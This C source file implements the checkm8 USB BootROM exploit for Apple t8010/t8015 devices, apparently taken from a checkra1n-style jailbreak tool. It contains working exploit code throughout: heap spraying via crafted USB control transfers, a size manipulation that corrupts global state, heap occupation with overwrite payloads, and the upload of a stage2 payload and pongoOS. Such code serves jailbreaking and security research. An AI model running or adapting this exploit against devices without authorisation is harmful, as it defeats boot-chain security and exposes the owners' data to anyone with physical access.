
#include <iousb.h>

unsigned char blank[2048]; // 00000000...
unsigned char AAAA[2048];  // 41414141...

// log
static int empty(void){
    return 0;
}

#ifdef HAVE_DEBUG
#define DEBUG_(...) printf(__VA_ARGS__)
#else
#define DEBUG_(...) empty()
#endif

void heap_spray(io_client_t client){
    IOReturn r;
    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);;
    usleep(1000);
    
#ifndef IPHONEOS_ARM
    r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
    
    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    DEBUG_("%x\n", r); // kIOUSBTransactionTimeout
#else
    // For iOS devices (especially older ones)
    // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
    for(int i=0;i<16384;i++){
        r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        if(r != 0) break;
    }
    DEBUG_("%x\n", r);
#endif
    
    for(int i=0;i<64;i++){
        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    }
    
    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    
    for(int i=0;i<16;i++){
        r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    }
    
    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    
    r = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    
}

void set_global_state(io_client_t client){
    IOReturn r;
    unsigned int val;
    unsigned int sent;
    
    //r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0);
    //usleep(1000);
    
    //r = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x21, 1, 0x0000, 0x0000, AAAA, 64, 0);
    //usleep(1000);
    
    r = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, AAAA, 2048, 0);
    usleep(1000);
    
    val = 1408; // t8010 & t8015
    {
        // val haxx
        val += 0x40;
        sent = r;
        DEBUG_("sent: %x\n", sent);
        if(sent>val){
            sent = 0;
        }
        val -= sent;
        DEBUG_("val: %x\n", val);
    }
    
    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, AAAA, val, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    
}

void heap_occupation(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    IOReturn r;
    
    r = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    usleep(100000);
    
    for(int i=0;i<16;i++){
        r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
    }
    usleep(10000);
    
    r = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, AAAA, 512, 100);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
        
    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    
}

void payload_stage2(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    IOReturn r;
    {
        size_t len = 0;
        size_t size;
        size_t sent;
        while(len < payload.stage2_len) {
            size = ((payload.stage2_len - len) > 0x800) ? 0x800 : (payload.stage2_len - len);
            sent = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload.stage2[len], size, 100);
            len += size;
        }
    }
    usleep(1000);
    
    r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    usleep(1000);
    
}

void pongo(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    IOReturn r;
    
    //r = usb_ctrl_transfer(client, 0x40, 64, 0x03e8, 0x01f4, NULL, 0); // ?
    
    {
        size_t len = 0;
        size_t size;
        size_t sent;
        while(len < payload.pongoOS_len) {
            size = ((payload.pongoOS_len - len) > 0x800) ? 0x800 : (payload.pongoOS_len - len);
            sent = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload.pongoOS[len], size);
            len += size;
        }
    }
    
    r = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, NULL, 0);
    r = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
    r = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
    r = usb_ctrl_transfer(client, 0xa1, 3, 0x0000, 0x0000, blank, 8);
    
}


int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t payload){
    int r;
    
    bzero(blank, 2048);
    memset(AAAA, 'A', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG_DEBUG("reconnect");
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] running heap_spray()");
    heap_spray(client);
    
    LOG_DEBUG("reconnect");
    io_reset(client);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] running set_global_state()");
    set_global_state(client);
    
    LOG_DEBUG("reconnect");
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] running heap_occupation()");
    heap_occupation(client, cpid, payload);
    
    LOG_DEBUG("reconnect");
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time(&client, 5);
    if(!client) {
        LOG_ERROR("ERROR: Failed to reconnect to device");
        return -1;
    }
    
    LOG_DEBUG("[checkra1n] sending stage2 payload");
    payload_stage2(client, cpid, payload);
    
    LOG_DEBUG("reconnect");
    io_reset(client);
    io_close(client);
    client = NULL;
    sleep(5);
    get_device_stage2(&client, 15);
    if(!client) {
        LOG_ERROR("ERROR: Failed to connect to checkra1n DFU");
        return -1;
    }
    
    LOG_DONE("[checkra1n] connected to Stage2");
    
    LOG_DEBUG("[checkra1n] sending pongoOS");
    pongo(client, cpid, payload);
    
    io_reset(client);
    io_close(client);
    
    LOG_DONE("[checkra1n] BOOTED");
    return 0;
}
